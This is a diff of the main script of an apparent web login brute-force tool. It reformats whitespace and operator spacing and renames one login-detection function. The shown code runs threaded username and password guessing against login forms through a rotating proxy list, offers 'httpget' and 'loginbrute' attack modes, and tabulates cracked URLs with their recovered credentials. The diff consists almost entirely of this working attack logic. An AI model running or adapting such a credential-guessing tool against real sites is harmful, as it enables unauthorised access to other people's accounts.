@@ -6,27 +6,27 @@ def attack(options, loginInfo):
 		# Run threads
 		for thread in threads:
 			thread.start()
-		
+
 		# Wait for threads completed
 		for thread in threads:
 			completed += 1
 			progressbar.progress_bar(sending, completed, total)
 			thread.join()
-		
+
 		return sending, completed
-	
+
 	### SETTING UP FOR NEW ATTACK ###
 	if options.attack_mode == "--httpget":
 		from modules import httpget
 		attack_module = httpget.submit
-	
+
 	elif options.attack_mode == "--loginbrute":
 		from modules import loginbrute
 		attack_module = loginbrute.submit
 	else:
 		events.error("Invalid attack mode", "ARGS")
 		sys.exit(1)
-	
+
 	if not loginInfo:
 		# Test for 2 steps... login?
 		events.error("No login request found")
@@ -34,24 +34,24 @@ def attack(options, loginInfo):
 	else:
 		if options.verbose:
 			events.success("Login request has been found", "CHECK")
-	
+
 	tasks = len(options.passwd) * len(options.username)
 	events.info("[Tasks: %s] [ID: %s] [Controls: %s]" % (tasks, loginInfo[0], loginInfo[1][::-1]))
-	
+
 	import threading
-	
+
 	if sys.version_info[0] == 2:
 		import Queue
 		result = Queue.Queue()
 	else:
 		import queue
 		result = queue.Queue()
-	
+
 	sending, completed = 0, 0
 	try:
 		#### START ATTACK ####
 		workers = []
-		
+
 		for username in options.username:
 			if "--upwd" in options.extras \
 					and username not in options.passwd \
@@ -61,30 +61,30 @@ def attack(options, loginInfo):
 				if len(workers) == options.threads:
 					sending, completed = run_threads(workers, sending, completed, tasks)
 					del workers[:]
-				
+
 				if username in [x[1] for x in list(result.queue)]:
 					break
 				worker = threading.Thread(
-					target = attack_module,
-					args = (options, loginInfo, [password, username], result)
+					target=attack_module,
+					args=(options, loginInfo, [password, username], result)
 				)
 				worker.daemon = True
 				workers.append(worker)
-		
+
 		sending, completed = run_threads(workers, sending, completed, tasks)
 		del workers[:]
-	
+
 	except KeyboardInterrupt:
 		events.error("Terminated by user", "STOPPED")
 		global set_break
 		set_break = True
-	
+
 	except SystemExit:
 		events.error("Terminated by user", "STOPPED")
-	
+
 	except Exception as error:
-		events.error("%s" %(error))
-	
+		events.error("%s" % (error))
+
 	finally:
 		try:  # clear resource
 			del options.username[:]
@@ -94,7 +94,7 @@ def attack(options, loginInfo):
 		credentials = list(result.queue)
 		if len(credentials) == 0:
 			events.error("No match found", "RESULT")
-		
+
 		else:
 			events.success("%s valid password[s] found" % (len(credentials)), "RESULT")
 			if not credentials[0][1]:
@@ -113,13 +113,13 @@ if __name__ == "__main__":
 	import utils
 	from utils import progressbar, banners, events
 	from extras import getproxy
-	
+
 	try:
 		# Setting new session
 		runtime = time.time()
 		# reload(sys)
 		# sys.setdefaultencoding('utf8')
-		
+
 		# Get options
 		options = options.ParseOptions()
 
@@ -164,7 +164,7 @@ if __name__ == "__main__":
 						getproxy.check(options)
 					if options.run_options["--proxy"]:
 						if len(options.target) > 1:
-							events.info("Check proxy connection for %s" %(options.url))
+							events.info("Check proxy connection for %s" % (options.url))
 							getproxy.check(options)
 						try:
 							options.proxy = getproxy.livelist()
@@ -174,7 +174,7 @@ if __name__ == "__main__":
 							options.proxy = getproxy.livelist()
 
 					events.info("[%s / %s] [%s]" % (idu + 1, len(options.target), options.url))
-					loginInfo = check.check_login_request(options)
+					loginInfo = check.find_login_request(options)
 					if loginInfo:
 						check.check_tasks(options, loginInfo)
 						result = attack(options, loginInfo)
@@ -189,17 +189,17 @@ if __name__ == "__main__":
 				from extras import reauth
 
 				reauth.run(options, result)
-	
+
 	except Exception as error:
 		events.error("%s" % (error), "STOPPED")
 		sys.exit(1)
-	
+
 	finally:
 		runtime = time.time() - runtime
 		try:
 			if len(options.target) > 0:
 				if len(results) > 0 and len(options.target) > 1:
-					events.success("Cracked %s target[s]" %(len(results)), "RESULT")
+					events.success("Cracked %s target[s]" % (len(results)), "RESULT")
 					utils.print_table(("URL", "Username", "Password"), *results)
 			else:
 				events.error("No target has been cracked", "RESULT")
